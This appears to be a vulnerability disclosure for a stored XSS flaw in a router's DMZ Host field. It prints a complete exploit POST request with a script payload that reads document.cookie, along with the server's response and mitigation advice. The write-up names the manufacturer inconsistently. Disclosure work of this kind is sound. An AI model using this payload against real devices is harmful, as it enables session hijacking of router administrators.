# CVE-2025-29712 TAKASHI Wireless Instant Router and Repeater - XSS Vulnerability

## Overview
A stored cross-site scripting (XSS) vulnerability has been identified in the TAKASHI Wireless Instant Router and Repeater (Model A5) running firmware version **V5.07.38_AAL03** with hardware version **V3.0**. This vulnerability arises due to improper sanitization of user input in the `DMZ Host` IP address field.

## Affected Model
- **Model**: A5
- **Manufacturer**: Tenda 
- **Software Version**: V5.07.38_AAL03  
- **Hardware Version**: V3.0  

## Vulnerability Details
A cross-site scripting (XSS) vulnerability in Takashi Wireless Instant
Router and Repeater (Model A5) firmware v5.07.38_AAL03 with hardware
v3.0 allows attackers to execute arbitrary web scripts or HTML via
injecting a crafted payload into the DMZ Host parameter.

### Exploit Request
The following `POST` request demonstrates the XSS injection:

```
POST /goform/VirSerDMZ HTTP/1.1
Host: 192.168.2.1
Content-Length: 56
Cache-Control: max-age=0
Origin: http://192.168.2.1
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.2.1/nat_dmz.asp
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,nl;q=0.8
Cookie: admin:language=LOL
Connection: keep-alive

GO=nat_dmz.asp&dmzip=`</script><script>alert(document.cookie);</script>`
```

### Response
The request is processed successfully, redirecting the user back to the `nat_dmz.asp` page while storing the malicious script:

```
HTTP/1.0 302 Redirect
Server: GoAhead-Webs
Date: Thu Jan 01 00:53:41 1970
Pragma: no-cache
Cache-Control: no-cache
Content-Type: text/html
Location: http://192.168.2.1/nat_dmz.asp

<html>
<head></head>
<body>
    This document has moved to a new <span><a href="http://192.168.2.1/nat_dmz.asp">location</a></span>.<br>
    Please update your documents to reflect the new location.
</body>
</html>
```

## Impact
- Malicious JavaScript can be injected into the application.
- Users who visit the affected page will have their session cookies exposed.
- The attack could lead to session hijacking, phishing, or further exploitation.

## Mitigation
To mitigate this issue, the following steps should be taken:
1. **Server-side Input Validation**: Sanitize and validate user input before storing or reflecting it.
2. **Content Security Policy (CSP)**: Implement a strict CSP header to prevent inline script execution.
3. **Escaping Output**: Encode user input before rendering it in the browser.
4. **Disable Client-Side Validation Bypass**: Ensure all input validation occurs on the server-side in addition to any JavaScript validation.


## References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [GoAhead Web Server](https://www.embedthis.com/goahead/)

## Disclaimer
This vulnerability report is for educational and research purposes only. The information provided should not be used for malicious activities. Always obtain proper authorization before testing security vulnerabilities on any system.

---

**Contributors**  
- William James Schleppegrell -> https://github.com/SteamPunk424
  
- Martyn Lodder -> https://github.com/rootofficial
